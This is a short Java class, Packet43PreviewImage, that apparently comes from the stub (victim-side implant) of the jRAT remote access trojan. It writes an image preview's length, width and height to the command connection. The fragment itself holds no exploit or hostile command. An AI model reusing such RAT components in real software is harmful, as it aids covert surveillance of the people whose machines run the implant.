package su.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import su.jrat.common.io.StringWriter;
import su.jrat.stub.Connection;


public class Packet43PreviewImage extends AbstractOutgoingPacket {

	private int length;
	private int width;
	private int height;

	public Packet43PreviewImage(int length, int width, int height) {
		this.length = length;
		this.width = width;
		this.height = height;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(length);
		dos.writeInt(width);
		dos.writeInt(height);

		Connection.lock();
	}

	@Override
	public byte getPacketId() {
		return 43;
	}

}
